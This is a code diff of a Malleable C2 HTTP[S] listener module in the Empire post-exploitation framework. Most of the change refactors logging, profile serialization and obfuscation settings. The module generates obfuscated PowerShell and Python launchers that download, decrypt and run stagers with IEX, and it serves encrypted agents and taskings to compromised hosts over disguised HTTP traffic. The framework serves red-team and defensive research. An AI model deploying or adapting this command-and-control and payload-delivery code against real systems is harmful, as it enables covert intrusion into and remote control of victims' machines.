@@ -2,39 +2,54 @@ from __future__ import print_function
 
 import base64
 import copy
-import json
 import logging
 import os
 import random
 import ssl
-import string
 import sys
 import time
 import urllib.parse
 from builtins import object, str
-from typing import List
+from typing import List, Optional, Tuple
 
-from flask import Flask, Response, make_response, render_template, request
-from pydispatch import dispatcher
+from flask import Flask, Response, make_response, request
 
 from empire.server.common import encryption, helpers, malleable, packets, templating
-from empire.server.database import models
-from empire.server.database.base import Session
-from empire.server.utils import data_util, listener_util
+from empire.server.common.empire import MainMenu
+from empire.server.core.db import models
+from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util, listener_util, log_util
+from empire.server.utils.module_util import handle_validate_message
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
-
+    def __init__(self, mainMenu: MainMenu, params=[]):
         self.info = {
             "Name": "HTTP[S] MALLEABLE",
-            "Author": ["@harmj0y", "@johneiser"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                },
+                {
+                    "Name": "",
+                    "Handle": "@johneiser",
+                    "Link": "",
+                },
+            ],
             "Description": (
                 "Starts a http[s] listener (PowerShell or Python) that adheres to a Malleable C2 profile."
             ),
             # categories - client_server, peer_to_peer, broadcast, third_party
             "Category": ("client_server"),
             "Comments": [],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -139,27 +154,24 @@ class Listener(object):
             data_util.get_config("staging_key")[0]
         )
 
+        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+
+        self.instance_log = log
+
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
         """
         return open(f"{self.template_dir }/default.html", "r").read()
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
         Validate all options for this listener.
         """
 
-        for key in self.options:
-            if self.options[key]["Required"] and (
-                str(self.options[key]["Value"]).strip() == ""
-            ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return False
-
         profile_name = self.options["Profile"]["Value"]
         profile_data = (
-            Session()
+            SessionLocal()
             .query(models.Profile)
             .filter(models.Profile.name == profile_name)
             .first()
@@ -187,11 +199,7 @@ class Listener(object):
 
             if profile.validate():
                 # store serialized profile for use across sessions
-                self.options["ProfileSerialized"] = {
-                    "Description": "Serialized version of the provided Malleable C2 profile.",
-                    "Required": False,
-                    "Value": profile._serialize(),
-                }
+                self.serialized_profile = profile._serialize()
 
                 # for agent compatibility (use post for staging)
                 self.options["DefaultProfile"] = {
@@ -225,34 +233,29 @@ class Listener(object):
                     profile.post.client.headers.pop(header, None)
 
             else:
-                print(
-                    helpers.color(
-                        "[!] Unable to parse malleable profile: %s" % (profile_name)
-                    )
+                return handle_validate_message(
+                    f"[!] Unable to parse malleable profile: {profile_name}"
                 )
-                return False
 
             if self.options["CertPath"]["Value"] == "" and self.options["Host"][
                 "Value"
             ].startswith("https"):
-                print(helpers.color("[!] HTTPS selected but no CertPath specified."))
-                return False
+                return handle_validate_message(
+                    "[!] HTTPS selected but no CertPath specified."
+                )
 
         except malleable.MalleableError as e:
-            print(
-                helpers.color(
-                    "[!] Error parsing malleable profile: %s, %s" % (profile_name, e)
-                )
+            return handle_validate_message(
+                f"[!] Error parsing malleable profile: {profile_name}, {e}"
             )
-            return False
 
-        return True
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -268,29 +271,26 @@ class Listener(object):
         """
         bypasses = [] if bypasses is None else bypasses
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/template generate_launcher(): no language specified!"
-                )
-            )
+            log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
-
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
+        if (
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
             # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
-            bindIP = listenerOptions["BindIP"]["Value"]
+            listenerOptions = active_listener.options
+
             port = listenerOptions["Port"]["Value"]
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
             stagingKey = listenerOptions["StagingKey"]["Value"]
 
             # build profile
-            profile = malleable.Profile._deserialize(
-                listenerOptions["ProfileSerialized"]["Value"]
-            )
+            profile = malleable.Profile._deserialize(self.serialized_profile)
             profile.stager.client.host = host
             profile.stager.client.port = port
             profile.stager.client.path = profile.stager.client.random_uri()
@@ -445,14 +445,13 @@ class Listener(object):
                 launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
-                    launcherBase = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
                         launcherBase,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
 
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(launcherBase, launcher)
                 else:
@@ -583,18 +582,9 @@ class Listener(object):
                     return launcherBase
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
-                    )
+                log.error(
+                    "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
                 )
-
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/template generate_launcher(): invalid listener name specification!"
-                )
-            )
 
     def generate_stager(
         self,
@@ -602,7 +592,7 @@ class Listener(object):
         encode=False,
         encrypt=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         language=None,
     ):
         """
@@ -610,10 +600,8 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http_malleable generate_stager(): no language specified!"
-                )
+            log.error(
+                "listeners/http_malleable generate_stager(): no language specified!"
             )
             return None
 
@@ -625,9 +613,7 @@ class Listener(object):
         killDate = listenerOptions["KillDate"]["Value"]
 
         # build profile
-        profile = malleable.Profile._deserialize(
-            listenerOptions["ProfileSerialized"]["Value"]
-        )
+        profile = malleable.Profile._deserialize(self.serialized_profile)
         profile.stager.client.host = host
         profile.stager.client.port = port
 
@@ -658,7 +644,7 @@ class Listener(object):
             stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
+            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -687,10 +673,9 @@ class Listener(object):
             )
 
             if obfuscate:
-                unobfuscated_stager = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
                     unobfuscated_stager,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
 
             if encode:
@@ -740,10 +725,8 @@ class Listener(object):
                 return stager
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
         return None
@@ -753,7 +736,7 @@ class Listener(object):
         listenerOptions,
         language=None,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         version="",
     ):
         """
@@ -761,17 +744,13 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http_malleable generate_agent(): no language specified!"
-                )
+            log.error(
+                "listeners/http_malleable generate_agent(): no language specified!"
             )
             return None
 
         # build profile
-        profile = malleable.Profile._deserialize(
-            listenerOptions["ProfileSerialized"]["Value"]
-        )
+        profile = malleable.Profile._deserialize(self.serialized_profile)
 
         language = language.lower()
         delay = listenerOptions["DefaultDelay"]["Value"]
@@ -791,7 +770,7 @@ class Listener(object):
                 code = f.read()
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            code = data_util.keyword_obfuscation(code)
+            code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             # strip out the comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -815,10 +794,9 @@ class Listener(object):
                     "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                 )
             if obfuscate:
-                code = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             return code
 
@@ -857,10 +835,8 @@ class Listener(object):
 
             return code
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_comms(self, listenerOptions, language=None):
@@ -874,9 +850,7 @@ class Listener(object):
         port = listenerOptions["Port"]["Value"]
 
         # build profile
-        profile = malleable.Profile._deserialize(
-            listenerOptions["ProfileSerialized"]["Value"]
-        )
+        profile = malleable.Profile._deserialize(self.serialized_profile)
         profile.get.client.host = host
         profile.get.client.port = port
         profile.post.client.host = host
@@ -1056,7 +1030,7 @@ $vWc.Proxy = $Script:Proxy;
                 # ==== ADD PARAMETERS ====
                 first = True
                 for parameter, value in profile.post.client.parameters.items():
-                    sendMessage += f"$taskURI += '" + ("?" if first else "&") + "';"
+                    sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
                     sendMessage += f"$taskURI += '{ parameter }={ value }';"
                 if (
@@ -1343,17 +1317,11 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 return updateServers + sendMessage
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
-                    )
+                log.error(
+                    "listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/template generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/template generate_comms(): no language specified!")
 
     def start_server(self, listenerOptions):
         """
@@ -1368,15 +1336,10 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
         port = listenerOptions["Port"]["Value"]
         host = listenerOptions["Host"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
-        listenerName = listenerOptions["Name"]["Value"]
-        proxy = listenerOptions["Proxy"]["Value"]
-        proxyCreds = listenerOptions["ProxyCreds"]["Value"]
         certPath = listenerOptions["CertPath"]["Value"]
 
         # build and validate profile
-        profile = malleable.Profile._deserialize(
-            listenerOptions["ProfileSerialized"]["Value"]
-        )
+        profile = malleable.Profile._deserialize(self.serialized_profile)
         profile.validate()
 
         # suppress the normal Flask output
@@ -1384,7 +1347,6 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
         log.setLevel(logging.ERROR)
 
         # initialize flask server
-        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
         app = Flask(__name__, template_folder=self.template_dir)
         self.app = app
 
@@ -1399,23 +1361,12 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
             url = request.url
             method = request.method
             headers = request.headers
-            profile = malleable.Profile._deserialize(
-                self.options["ProfileSerialized"]["Value"]
-            )
+            profile = malleable.Profile._deserialize(self.serialized_profile)
 
             # log request
             listenerName = self.options["Name"]["Value"]
-            message = "[*] {} request for {}/{} from {} ({} bytes)".format(
-                request.method.upper(),
-                request.host,
-                request_uri,
-                clientIP,
-                len(request.data),
-            )
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(
-                signal, sender="listeners/http_malleable/{}".format(listenerName)
-            )
+            message = f"{listenerName}: {request.method.upper()} request for {request.host}/{request_uri} from {clientIP} ({len(request.data)} bytes)"
+            self.instance_log.info(message)
 
             try:
                 # build malleable request from flask request
@@ -1472,7 +1423,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                             stagingKey, agentInfo, listenerOptions, clientIP
                         )
                         if dataResults and len(dataResults) > 0:
-                            for (language, results) in dataResults:
+                            for language, results in dataResults:
                                 if results:
                                     if isinstance(results, str):
                                         results = results.encode("latin-1")
@@ -1480,26 +1431,25 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         # step 2 of negotiation -> server returns stager (stage 1)
 
                                         # log event
-                                        message = "[*] Sending {} stager (stage 1) to {}".format(
-                                            language, clientIP
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/http_malleable/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName} Sending {language} stager (stage 1) to {clientIP}"
+                                        self.instance_log.info(message)
+                                        log.info(message)
 
                                         # build stager (stage 1)
-                                        stager = self.generate_stager(
-                                            language=language,
-                                            listenerOptions=listenerOptions,
-                                            obfuscate=self.mainMenu.obfuscate,
-                                            obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                        )
+                                        with SessionLocal() as db:
+                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                                db, language
+                                            )
+                                            stager = self.generate_stager(
+                                                language=language,
+                                                listenerOptions=listenerOptions,
+                                                obfuscate=False
+                                                if not obf_config
+                                                else obf_config.enabled,
+                                                obfuscation_command=""
+                                                if not obf_config
+                                                else obf_config.command,
+                                            )
 
                                         # build malleable response with stager (stage 1)
                                         malleableResponse = (
@@ -1526,18 +1476,9 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         ]["sessionKey"]
 
                                         # log event
-                                        message = "[*] Sending agent (stage 2) to {} at {}".format(
-                                            sessionID, clientIP
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/http_malleable/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
+                                        self.instance_log.info(message)
+                                        log.info(message)
 
                                         # TODO: handle this with malleable??
                                         tempListenerOptions = None
@@ -1564,7 +1505,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                                     )
 
                                         session_info = (
-                                            Session()
+                                            SessionLocal()
                                             .query(models.Agent)
                                             .filter(
                                                 models.Agent.session_id == sessionID
@@ -1577,17 +1518,29 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                             version = ""
 
                                         # generate agent
-                                        agentCode = self.generate_agent(
-                                            language=language,
-                                            listenerOptions=(
-                                                tempListenerOptions
-                                                if tempListenerOptions
-                                                else listenerOptions
-                                            ),
-                                            obfuscate=self.mainMenu.obfuscate,
-                                            obfuscationCommand=self.mainMenu.obfuscateCommand,
-                                            version=version,
-                                        )
+                                        with SessionLocal() as db:
+                                            obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                                db, language
+                                            )
+                                            agentCode = self.generate_agent(
+                                                language=language,
+                                                listenerOptions=(
+                                                    tempListenerOptions
+                                                    if tempListenerOptions
+                                                    else listenerOptions
+                                                ),
+                                                obfuscate=False
+                                                if not obf_config
+                                                else obf_config.enabled,
+                                                obfuscation_command=""
+                                                if not obf_config
+                                                else obf_config.command,
+                                                version=version,
+                                            )
+
+                                        if language.lower() in ["python", "ironpython"]:
+                                            sessionKey = bytes.fromhex(sessionKey)
+
                                         encryptedAgent = (
                                             encryption.aes_encrypt_then_hmac(
                                                 sessionKey, agentCode
@@ -1606,43 +1559,22 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         b"error"
                                     ) or results[:10].lower().startswith(b"exception"):
                                         # agent returned an error
-                                        message = "[!] Error returned for results by {} : {}".format(
-                                            clientIP, results
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/http_malleable/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
+                                        self.instance_log.error(message)
+                                        log.error(message)
 
                                         return Response(self.default_response(), 404)
 
                                     elif results.startswith(b"ERROR:"):
                                         # error parsing agent data
-                                        message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
-                                            request_uri, clientIP, results
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/http_malleable/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
+                                        self.instance_log.error(message)
+                                        log.error(message)
 
                                         if b"not in cache" in results:
                                             # signal the client to restage
-                                            print(
-                                                helpers.color(
-                                                    "[*] Orphaned agent from %s, signaling restaging"
-                                                    % (clientIP)
-                                                )
+                                            log.info(
+                                                f"{listenerName} Orphaned agent from {clientIP}, signaling restaging"
                                             )
                                             return make_response("", 401)
 
@@ -1650,20 +1582,8 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                                     elif results == b"VALID":
                                         # agent posted results
-                                        message = (
-                                            "[*] Valid results returned by {}".format(
-                                                clientIP
-                                            )
-                                        )
-                                        signal = json.dumps(
-                                            {"print": False, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/http/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName} Valid results returned by {clientIP}"
+                                        self.instance_log.info(message)
 
                                         malleableResponse = (
                                             implementation.construct_server("")
@@ -1678,21 +1598,9 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                         if request.method == b"POST":
                                             # step 4 of negotiation -> server returns RSA(nonce+AESsession))
 
-                                            # log event
-                                            message = (
-                                                "[*] Sending session key to {}".format(
-                                                    clientIP
-                                                )
-                                            )
-                                            signal = json.dumps(
-                                                {"print": True, "message": message}
-                                            )
-                                            dispatcher.send(
-                                                signal,
-                                                sender="listeners/http_malleable/{}".format(
-                                                    listenerName
-                                                ),
-                                            )
+                                            message = f"{listenerName}: Sending session key to {clientIP}"
+                                            self.instance_log.info(message)
+                                            log.info(message)
 
                                             # note: stage 1 negotiation comms are hard coded, so we can't use malleable
                                             return Response(
@@ -1703,18 +1611,8 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                                         else:
                                             # agent requested taskings
-                                            message = "[*] Agent from {} retrieved taskings".format(
-                                                clientIP
-                                            )
-                                            signal = json.dumps(
-                                                {"print": False, "message": message}
-                                            )
-                                            dispatcher.send(
-                                                signal,
-                                                sender="listeners/http_malleable/{}".format(
-                                                    listenerName
-                                                ),
-                                            )
+                                            message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                                            self.instance_log.info(message)
 
                                             # build malleable response with results
                                             malleableResponse = (
@@ -1734,20 +1632,8 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                                 else:
                                     # no tasking for agent
-                                    message = (
-                                        "[*] Agent from {} retrieved taskings".format(
-                                            clientIP
-                                        )
-                                    )
-                                    signal = json.dumps(
-                                        {"print": False, "message": message}
-                                    )
-                                    dispatcher.send(
-                                        signal,
-                                        sender="listeners/http_malleable/{}".format(
-                                            listenerName
-                                        ),
-                                    )
+                                    message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                                    self.instance_log.info(message)
 
                                     # build malleable response with no results
                                     malleableResponse = implementation.construct_server(
@@ -1760,46 +1646,24 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                                     )
                         else:
                             # log error parsing routing packet
-                            message = (
-                                "[!] Error parsing routing packet from {}: {}.".format(
-                                    clientIP, str(agentInfo)
-                                )
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/http_malleable/{}".format(
-                                    listenerName
-                                ),
-                            )
+                            message = f"{listenerName} Error parsing routing packet from {clientIP}: {str(agentInfo)}."
+                            self.instance_log.error(message)
+                            log.error(message)
 
                     # log invalid request
-                    message = "[!] /{} requested by {} with no routing packet.".format(
-                        request_uri, clientIP
-                    )
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal,
-                        sender="listeners/http_malleable/{}".format(listenerName),
-                    )
+                    message = f"/{request_uri} requested by {clientIP} with no routing packet."
+                    self.instance_log.error(message)
 
                 else:
                     # log invalid uri
-                    message = "[!] unknown uri /{} requested by {}.".format(
-                        request_uri, clientIP
-                    )
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal,
-                        sender="listeners/http_malleable/{}".format(listenerName),
-                    )
+                    message = f"{listenerName}: unknown uri /{request_uri} requested by {clientIP}."
+                    self.instance_log.warning(message)
 
             except malleable.MalleableError as e:
                 # probably an issue with the malleable library, please report it :)
-                message = "[!] Malleable had trouble handling a request for /{} by {}: {}.".format(
-                    request_uri, clientIP, str(e)
-                )
-                signal = json.dumps({"print": True, "message": message})
+                message = f"{listenerName}: Malleable had trouble handling a request for /{request_uri} by {clientIP}: {str(e)}."
+                self.instance_log.error(message, exc_info=True)
+                log.error(message, exc_info=True)
 
             return Response(self.default_response(), 200)
 
@@ -1808,11 +1672,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
             if host.startswith("https"):
                 if certPath.strip() == "" or not os.path.isdir(certPath):
-                    print(
-                        helpers.color(
-                            "[!] Unable to find certpath %s, using default." % certPath
-                        )
-                    )
+                    log.info(f"Unable to find certpath {certPath}, using default.")
                     certPath = "setup"
                 certPath = os.path.abspath(certPath)
                 pyversion = sys.version_info
@@ -1838,25 +1698,19 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
         except Exception as e:
-            print(
-                helpers.color(
-                    "[!] Listener startup on port %s failed - %s: %s"
-                    % (port, e.__class__.__name__, str(e))
-                )
-            )
-            message = "[!] Listener startup on port {} failed - {}: {}".format(
-                port, e.__class__.__name__, str(e)
-            )
-            signal = json.dumps({"print": True, "message": message})
-            dispatcher.send(
-                signal, sender="listeners/http_malleable/{}".format(listenerName)
-            )
+            message = f"Listener startup on port {port} failed - {e.__class__.__name__}: {str(e)}"
+            self.instance_log.error(message, exc_info=True)
+            log.error(message, exc_info=True)
 
     def start(self, name=""):
         """
         Start a threaded instance of self.start_server() and store it in
         the self.threads dictionary keyed by the listener name.
         """
+        self.instance_log = log_util.get_listener_logger(
+            LOG_NAME_PREFIX, self.options["Name"]["Value"]
+        )
+
         listenerOptions = self.options
         if name and name != "":
             self.threads[name] = helpers.KThread(
@@ -1881,14 +1735,11 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
-            self.threads[name].kill()
+            to_kill = name
         else:
-            print(
-                helpers.color(
-                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
-                )
-            )
-            self.threads[self.options["Name"]["Value"]].kill()
+            to_kill = self.options["Name"]["Value"]
+
+        self.instance_log.info(f"{to_kill}: shutting down...")
+        log.info(f"{to_kill}: shutting down...")
+        self.threads[to_kill].kill()
